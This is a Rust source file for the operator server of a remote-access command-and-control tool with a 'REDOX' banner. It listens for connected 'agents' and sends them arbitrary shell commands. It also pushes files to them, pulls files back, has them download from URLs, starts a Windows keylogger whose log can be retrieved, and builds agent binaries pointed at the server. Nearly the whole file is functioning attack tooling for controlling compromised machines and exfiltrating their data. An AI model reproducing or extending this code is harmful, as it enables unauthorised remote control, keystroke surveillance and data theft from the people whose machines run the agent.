use std::process::{Command,exit};
use std::io::{self, Write, BufReader, BufRead};
use std::net::Ipv4Addr;
use std::mem::drop;
use std::net::{Shutdown, SocketAddrV4, TcpListener, TcpStream};
use std::env;

fn handle_connection(clientsocket: &mut TcpStream, clients: &Arc<Mutex<HashMap<String, TcpStream>>>, port2: &String) {
    println!("New client connected: {}", clientsocket.local_addr().unwrap());
    let clientaddr = clientsocket.peer_addr().unwrap();
    let client_list = clients.lock().unwrap().keys().cloned().collect::<Vec<String>>();
    let num_clients = client_list.len();
    println!(" 
        _______________________________________________________________       
        Active:   Server: {} <- Client: {}      
        _______________________________________________________________
        ({:?} Agents in Session List):

        {:?}
        _______________________________________________________________

        Type 'rtfm' for help \n", clientsocket.local_addr().unwrap(),clientaddr,num_clients,client_list,); //,clients.keys(), clientsocket.local_addr().unwrap(),clientaddr); // {:?} inside Map

    loop {
        println!("Enter Command to send Agent-{} : ",clientaddr);
        let mut msg = String::new();
        io::stdin().read_line(&mut msg).expect("String expected");
        if msg.trim()==String::from("rtfm"){ 
            println!("THE MANUAL_________________________________________________________________\n");
            if cfg!(windows) {
                println!("Usage: [COMMAND]           Gives result\n");
                println!(" dl,                       Asks for source url and filename to write\n");
                println!(" tx,                       Asks for filename to send from server in current directory\n");
                println!(" rx,                       Asks for filename to receive from client in current directory\n");
                println!(" logger,                   Starts logging on agent device (Windows only)\n");
                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                println!(" local,                    Allows commands to send to local server OS while in shell\n");
                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
                println!(" quit,                     Quits current client connection\n");
            } else if cfg!(unix) { 
                println!("Usage: [COMMAND]           Gives result\n");
                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                println!(" logger,                   Starts logging on agent device (Windows only)\n");
                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                println!(" local,                    Allows commands to send to local server OS while in shell\n");
                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
                println!(" quit,                     Quits current client connection\n");
            } else if cfg!(target_os = "macos") {
                println!("Usage: [COMMAND]           Gives result\n");
                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                println!(" logger,                   Starts logging on agent device (Windows only)\n");
                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                println!(" local,                    Allows commands to send to local server OS while in shell\n");
                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
                println!(" quit,                     Quits current client connection\n");
            }
            continue;
        }
        if msg.trim().contains("dl"){
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Sent dl command? {}", &msg);
            println!("Enter url of file to dl: {}", &clientaddr);
            let mut msg = String::new();
            io::stdin().read_line(&mut msg).expect("Url String expected");
            msg.push('\0');
            clientsocket.write(msg.as_bytes());
            println!("Sent url? {}", &msg);
            let mut buffer: Vec<u8> = Vec::new();
            println!("Enter url of filename to write: {}", &clientaddr);
            let mut msg = String::new();
            io::stdin().read_line(&mut msg).expect("String expected");
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Sent flnm{}", &msg);
            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
            println!("client {} sent \n{}", clientaddr, String::from_utf8_lossy(&buffer));
        } else if msg.trim()==String::from("tx"){ //send files to client
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Enter name of file to send: {}", &clientaddr);
            let mut msg = String::new();
            io::stdin().read_line(&mut msg).expect("String expected");
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Sent {}", &msg);
            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
            send_to_client(clientsocket, &msg);
        } else if msg.trim()==String::from("rx"){ //receive files from client
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Sent rx command {}", &msg);
            println!("Enter file name to download: {}", &clientaddr);
            let mut msgfn = String::new();
            io::stdin().read_line(&mut msgfn).expect("String expected");
            msgfn.push('\0');
            clientsocket.write(msgfn.as_bytes());
            println!("Sent flnm: {}", &msgfn);
            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
            handle_client_rx(clientsocket);
        }  else if msg.trim()==String::from("local"){ //send commands to local server OS
            msg.push('\0');
            println!("Enter name of Command to send locally: ");
            let mut msg = String::new();
            io::stdin().read_line(&mut msg).expect("String expected");
            let mut output =executecmd(String::from(&msg).trim_end_matches('\0'));
            output.push('\0');
            println!("Local Returns \n{}", &output);
            continue;
        }  else if msg.trim()==String::from("logger"){ //starts key logger
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Sent command {}", &msg);
            println!("Experimental Feature, works only on Windows for now'\n");
            println!("Started logging. When you want to retrieve logs, type 'rx' then '.keylogger'\n");
            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
            continue;
        } else if msg.trim()==String::from("build"){ //send commands to local server OS
            msg.push('\0');
            println!("Enter the IP address that your agent should connect to (Ex: 192.168.1.1) : ");
            let mut msgip = String::new();
            io::stdin().read_line(&mut msgip).expect("String expected");
            let mut cmd_env_var_ip = format!("set AGENT_IP=\"{}\"", msgip.trim().to_string());
            println!("{}",cmd_env_var_ip);
            let mut pwrsh_env_var_ip = format!("Set-Item -Path Env:AGENT_IP -Value \"{}\"", msgip.trim().to_string());
            println!("{}",pwrsh_env_var_ip);
            let mut lnx_env_var_ip = format!("export AGENT_IP=\"{}\"", msgip.trim().to_string());
            println!("{}",pwrsh_env_var_ip);
            println!("Enter the port number that your agent should connect to Ex: 9001 : ");
            let mut msgport = String::new();
            io::stdin().read_line(&mut msgport).expect("String expected");
            let mut cmd_env_var_port = format!("set AGENT_PORT=\"{}\"", msgport.trim().to_string());
            println!("{}",cmd_env_var_port);
            let mut pwrsh_env_var_port = format!("Set-Item -Path Env:AGENT_PORT -Value \"{}\"", msgport.trim().to_string());
            println!("{}",pwrsh_env_var_port);
            let mut lnx_env_var_port = format!("export AGENT_PORT=\"{}\"", msgport.trim().to_string());
            println!("{}",lnx_env_var_port);

            if cfg!(windows){
                let comspec = env::var("COMSPEC").unwrap_or_default();
                if comspec.ends_with("cmd.exe") {
                    println!("Current shell is cmd.exe");
                        let mut output =executecmd(String::from(&cmd_env_var_ip).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from(&cmd_env_var_port).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                } else if comspec.ends_with("powershell.exe") {
                    println!("Current shell is powershell.exe");
                        let mut output =executecmd(String::from(&pwrsh_env_var_ip).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from(&pwrsh_env_var_port).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                }
                continue;
            } else if cfg!(unix){
                // setting env vars for build
                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                continue;

            } else if cfg!(target_os = "macos"){
                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml").trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                continue;
            }
        } else if (msg.trim().contains("agents")){
            if let Some(last_client) = client_list.last() {
                println!("The current active Agent is: {}", last_client);
            } else {
                println!("No clients connected");
            }
            println!("We have {} Active agents", num_clients);
            println!("With ID's: {:?}\n", client_list);
            continue;
        } else {
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            clientsocket.write(msg.as_bytes());
            println!("Sent {}", &msg);
            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
        }
        msg.push('\0');
        let mut buffer: Vec<u8> = Vec::new();
        if msg.trim().contains("quit"){
            println!("shutting down client stream: {}", &clientaddr);
            clientsocket.shutdown(Shutdown::Both);
            //println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
            break;
        } 
        let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
        reader.read_until(b'\0', &mut buffer);
        println!("client {} sent \n{}", clientaddr, String::from_utf8_lossy(&buffer));
    }
    //v1
    println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
}

fn handle_local(clients: &Arc<Mutex<HashMap<String, TcpStream>>>) {
    //println!("New client connected: {}", clientsocket.local_addr().unwrap());
    //let clientaddr = clientsocket.peer_addr().unwrap();
    let client_list = clients.lock().unwrap().keys().cloned().collect::<Vec<String>>();
    let num_clients = client_list.len();
    
    println!("\n                              Welcome Home

                    █▄─▄▄▀█▄─▄▄─█▄─▄▄▀█─▄▄─█▄─▀─▄█
                    ██─▄─▄██─▄█▀██─██─█─██─██▀─▀██
                    ▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄█▄▄▀ 
                    
        _______________________________________________________________

        Type 'rtfm' for options. Type 'quit' to continue to listener\n");

    loop {
        println!("Enter Command: ");
        let mut msg = String::new();
        io::stdin().read_line(&mut msg).expect("String expected");

        if msg.trim()==String::from("quit"){
            println!("Continuing to wait for connections...");
            break;
        }
        if msg.trim()==String::from("rtfm"){ 
            println!("THE STAGING MENU_________________________________________________________________\n");
            if cfg!(windows) {
                println!("Usage: [COMMAND]           Gives result\n");
                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                println!(" quit,                     Quits Staging Menu and continues to Listener\n");
                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
            } else if cfg!(unix) { 
                println!("Usage: [COMMAND]           Gives result\n");
                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                println!(" quit,                     Quits Staging Menu and continues to Listener\n");
                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
            } else if cfg!(target_os = "macos") {
                println!("Usage: [COMMAND]           Gives result\n");
                println!(" dl,                       Available after connection, Asks for source url and filename to write\n");
                println!(" tx,                       Available after connection, Asks for filename to send from server in current directory\n");
                println!(" rx,                       Available after connection, Asks for filename to receive from client in current directory\n");
                println!(" quit,                     Quits Staging Menu and continues to Listener\n");
                println!(" agents,                   Shows connected devices. Type 'quit' to switch to the next connected client\n");
                println!(" build,                    Builds agent program, given server IP and port to connect to\n");
            }
        }
        else if msg.trim()==String::from("build"){ //send commands to local server OS
            msg.push('\0');
            println!("Enter the IP address that your agent should connect to (Ex: 192.168.1.1) : ");
            let mut msgip = String::new();
            io::stdin().read_line(&mut msgip).expect("String expected");
            let mut cmd_env_var_ip = format!("set AGENT_IP=\"{}\"", msgip.trim().to_string());
            println!("{}",cmd_env_var_ip);
            let mut pwrsh_env_var_ip = format!("Set-Item -Path Env:AGENT_IP -Value \"{}\"", msgip.trim().to_string());
            println!("{}",pwrsh_env_var_ip);
            let mut lnx_env_var_ip = format!("export AGENT_IP=\"{}\"", msgip.trim().to_string());
            println!("{}",pwrsh_env_var_ip);
            println!("Enter the port number that your agent should connect to Ex: 9001 : ");
            let mut msgport = String::new();
            io::stdin().read_line(&mut msgport).expect("String expected");
            let mut cmd_env_var_port = format!("set AGENT_PORT=\"{}\"", msgport.trim().to_string());
            println!("{}",cmd_env_var_port);
            let mut pwrsh_env_var_port = format!("Set-Item -Path Env:AGENT_PORT -Value \"{}\"", msgport.trim().to_string());
            println!("{}",pwrsh_env_var_port);
            let mut lnx_env_var_port = format!("export AGENT_PORT=\"{}\"", msgport.trim().to_string());
            println!("{}",lnx_env_var_port);

            if cfg!(windows){
                let comspec = env::var("COMSPEC").unwrap_or_default();
                if comspec.ends_with("cmd.exe") {
                    println!("Current shell is cmd.exe");
                        let mut output =executecmd(String::from(&cmd_env_var_ip).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from(&cmd_env_var_port).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml --release").trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);

                } else if comspec.ends_with("powershell.exe") {
                    println!("Current shell is powershell.exe");
                        let mut output =executecmd(String::from(&pwrsh_env_var_ip).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from(&pwrsh_env_var_port).trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);
                        let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml --release").trim_end_matches('\0'));
                        output.push('\0');
                        println!("Local Returns \n{}", &output);

                }
                continue;
            } else if cfg!(unix){
                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml --release").trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                continue;

            } else if cfg!(target_os = "macos"){
                let mut output =executecmd(String::from(&lnx_env_var_ip).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from(&lnx_env_var_port).trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                let mut output =executecmd(String::from("cargo build --manifest-path=../client/Cargo.toml --release").trim_end_matches('\0'));
                output.push('\0');
                println!("Local Returns \n{}", &output);
                continue;
            }
        } else if (msg.trim().contains("agents")){
            if let Some(last_client) = client_list.last() {
                println!("The current active Agent is: {}", last_client);
            } else {
                println!("No clients connected");
            }
            println!("We have {} Active agents", num_clients);
            println!("With ID's: {:?}\n", client_list);
            continue;
        }
        else {
            msg.push('\0');
            let mut buffer: Vec<u8> = Vec::new();
            let mut output =executecmd(String::from(&msg).trim_end_matches('\0'));
            println!("Local Returns: \n{}", &output);
        }
        if msg.trim()==String::from("quit"){
            println!("Going to connections");
            break;
        } 
    }
}

// downloads a file from current working directory located on client machine.
// this cannot take in the filename yet
use std::fs;
use std::io::prelude::*;
use std::io::{Read};
use std::path::Path;

 fn handle_client_rx(stream: &mut TcpStream) -> std::io::Result<()> {
    println!("Enter filename to save: ");
    let mut filename = String::new();
    io::stdin().read_line(&mut filename).expect("String expected");
    println!("Creating file {}", filename.replace('\n', "").replace('\r', ""));

    // Get File contents
    let mut file = File::create(filename.replace('\n', "").replace('\r', "")).unwrap();
    let mut buffer = [0; 1024];
    stream.set_read_timeout(Some(Duration::new(5, 0)));
    loop {
        let bytes_read = stream.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }
        file.write_all(&buffer[..bytes_read])?;
    }
    Ok(())
}

fn send_to_client(socket:&mut TcpStream, filename: & String) -> std::io::Result<()> { //port2: &String
    let fntext : String = String::from(filename.to_string()).trim_end_matches('\0').replace('\n', "").replace('\r', "");
    let file_path = Path::new(&fntext);
    println!("Opening file {:?}", file_path);
    let mut file = File::open(&file_path).map_err(|e| {
        std::io::Error::new(std::io::ErrorKind::NotFound, format!("Failed to open file: {:?}", file_path))
    })?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents);
    let mut socket = socket;
    // Send file name
    let filename = file_path.file_name().unwrap().to_str().unwrap();
    let filename_bytes = filename.as_bytes();
    let filename_len = filename_bytes.len();
    let contents_len = contents.len();
    socket.write_all(&contents)?;
    println!(
        "Sent file {} containing {} bytes {:?}",
        contents_len,
        String::from_utf8_lossy(&filename_bytes),
        contents
    );
    Ok(())
}

use std::cmp::min;
use std::fs::{File, OpenOptions};
use std::io::{Seek};
use reqwest::Client;
use indicatif::{ProgressBar, ProgressStyle};
use futures_util::StreamExt;

pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(), String> {
    let res = client
        .get(url)
        .send()
        .await
        .or(Err(format!("Failed to GET from '{}'", &url)))?;
    let total_size = res
        .content_length()
        .ok_or(format!("Failed to get content length from '{}'", &url))?;

    let pb = ProgressBar::new(total_size);
    pb.set_style(ProgressStyle::default_bar()
        .template("{msg}\n{spinner:.green} [{elapsed_precise}] [{wide_bar:.white/blue}] {bytes}/{total_bytes} ({bytes_per_sec}, {eta})")
        .progress_chars("█  "));
    pb.set_message(&format!("Downloading {}", url));

    let mut file;
    let mut downloaded: u64 = 0;
    let mut stream = res.bytes_stream();
    
    println!("Seeking in file.");
    if std::path::Path::new(path).exists() {
        println!("File exists. Resuming.");
        file = std::fs::OpenOptions::new()
            .read(true)
            .append(true)
            .open(path)
            .unwrap();

        let file_size = std::fs::metadata(path).unwrap().len();
        file.seek(std::io::SeekFrom::Start(file_size)).unwrap();
        downloaded = file_size;

    } else {
        println!("Fresh file..");
        file = File::create(path).or(Err(format!("Failed to create file '{}'", path)))?;
    }

    println!("Commencing transfer");
    while let Some(item) = stream.next().await {
        let chunk = item.or(Err(format!("Error while downloading file")))?;
        file.write(&chunk)
            .or(Err(format!("Error while writing to file")))?;
        let new = min(downloaded + (chunk.len() as u64), total_size);
        downloaded = new;
        pb.set_position(new);
    }

    pb.finish_with_message(&format!("Downloaded {} to {}", url, path));
    return Ok(());
}

use std::process::Output;
fn executecmd(cmd: &str) -> String {
    let client_os: (&str, &str);
    if cfg!(target_os = "windows") {
        client_os = ("cmd.exe", "/c");
    } else {
        client_os = ("/bin/bash", "-c");
    }
    let mut cmd_parts = vec![client_os.1, cmd];
    let extra_args: bool = cmd.contains(' ');

    let change_dir: bool = if extra_args {
        cmd_parts[1] == "cd"
    } else {
        false
    };
    let mut change_dir: bool = false;
    let mut cmd_parts_temp: Vec<&str> = ["",""].to_vec();
    if extra_args {
        if cfg!(unix){
            //adding fix for linux cleaning to last entry
            let last_length = cmd_parts.len()-1;
            let tempparts = cmd_parts[last_length];
            let tempparts2 = tempparts.trim_end_matches("\n");
            cmd_parts[last_length] = tempparts2;
        }
        else {
            cmd_parts = cmd.split(" ").collect();
        }
        change_dir = if extra_args {
            cmd_parts[0] == "cd"
        } else {
            false
        };

        cmd_parts_temp = cmd.split(" ").collect();
        if cfg!(unix){
            change_dir = if extra_args {
                cmd_parts_temp[0] == "cd"
            } else {
                false
            };
        }
        cmd_parts.insert(0, client_os.1);
        if let Some(last_cmd) = cmd_parts.last_mut() {
            *last_cmd = last_cmd.trim_end_matches("\r\n");
        }   
    }
    else {
        cmd_parts = cmd.split("\r").collect();
        cmd_parts.insert(0, client_os.1);
    }

    let mut stdout = String::new();
    let mut stderr = String::new();
    if change_dir {
        let dir: String;
        // for unix only, dir is diff
        if cfg!(unix){
            dir = cmd_parts_temp[1].to_string();
        }
        else {
            dir = cmd_parts[2].to_string();
        }
        //let dir = cmd_parts[2].to_string();
        println!("Moving dir: {}",dir);
        if std::env::set_current_dir(dir.trim()).is_ok() {
            let success = "Moved to new directory:";
            stdout = [success, &dir].join(" ");
        } else {
            stderr = "Could not change directory".to_owned();
        }
    } else {
        let res: Output = Command::new(client_os.0).args(cmd_parts.clone()).output().unwrap();
        stdout = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
        stderr = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
    }
    if stdout.len() > 0 {
        stdout
    } else {
        stderr
    }
}

use std::thread;
use tokio::runtime::Runtime;
use tokio::time::{sleep, Duration};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

#[tokio::main]
async fn main() { 
    // set ip address and port here
    let mut ipaddy = "0.0.0.0".to_string();
    let port = 9001;
    let port2 = "9001".to_string(); // for tx and rx of files
    
    let serveraddress = format!("{}:{}",ipaddy,port);
    let serveraddresstx = format!("{}:{}",ipaddy,port2);
    let ip = ipaddy.parse::<Ipv4Addr>().unwrap();
    let portu16:u16 = port;
    let mut s = SocketAddrV4::new(ip, port);

    println!("IP Address: {}", s.ip());
    println!("Port: {}", s.port());

    let listener = TcpListener::bind(s);
    let listener: () = match listener {
        Ok(l) => {
            println!("Successfully binded to {}", l.local_addr().unwrap());
        }
        Err(e) => {println!("{}",e); exit(0);}
    };

    let listener = TcpListener::bind(serveraddress.to_string()).unwrap();
    let clients: Arc<Mutex<HashMap<String, TcpStream>>> = Arc::new(Mutex::new(HashMap::new()));
    let mut clients_clone = clients.clone();

    println!("Waiting for connections...");

    handle_local(&clients_clone);

    // v1
    for mut con in listener.incoming(){
        match con {
            Ok(mut stream) =>{
                clients_clone = clients.clone();
                let port2clone = port2.clone();
                let client_id = stream.peer_addr().unwrap().to_string();
                clients_clone.lock().unwrap().insert(client_id.clone(), stream.try_clone().unwrap());
                let client_list = clients_clone.lock().unwrap()
                .keys()
                .map(|s| s.as_ref())
                .collect::<Vec<&str>>()
                .iter()
                .map(|s| s.to_string())
                .collect::<Vec<String>>();
            println!("Client list is: {:?}\n Connected clients are: {:?}", clients_clone, client_list);
                handle_connection(&mut stream, &clients_clone, &port2clone);
                clients_clone.lock().unwrap().remove(&client_id);
                let client_list = clients_clone.lock().unwrap().keys().cloned().collect::<Vec<String>>().iter()
                .map(|s| s.to_string())
                .collect::<Vec<String>>();
                println!("Connected clients: {:?}", client_list);
            }
            Err(e) => println!("{}", e),
        }
    }
    println!("Stopping server listener");
    drop(listener);
}

